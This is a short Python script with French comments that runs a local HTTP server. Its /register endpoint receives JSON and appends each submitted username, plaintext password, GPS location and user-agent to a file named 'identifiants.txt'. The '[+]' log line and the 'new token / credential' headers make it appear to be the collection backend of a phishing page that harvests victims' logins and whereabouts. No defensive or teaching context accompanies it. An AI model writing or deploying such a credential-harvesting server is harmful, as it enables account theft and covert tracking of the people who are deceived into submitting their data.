from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # Affichage dans la console
            print("[+] Nouvelles données reçues :", data)

            # Horodatage de la réception
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Enregistrement dans le fichier identifiants.txt
            with open('identifiants.txt', 'a', encoding='utf-8') as f:
                f.write(f"--- NOUVEAU TOKEN / IDENTIFIANT [{now}] ---\n")
                f.write(f"Utilisateur : {data.get('username')}\n")
                f.write(f"Mot de passe: {data.get('password')}\n")
                f.write(f"GPS         : {data.get('location')}\n")
                f.write(f"User-Agent  : {data.get('userAgent')}\n")
                f.write("=" * 45 + "\n\n")

            # Réponse JSON envoyée au navigateur
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

# Lancement du serveur sur le port 8080
server_address = ('', 8080)
httpd = HTTPServer(server_address, MyHandler)
print("Serveur lancé avec succès sur http://localhost:8080 ...")
httpd.serve_forever()
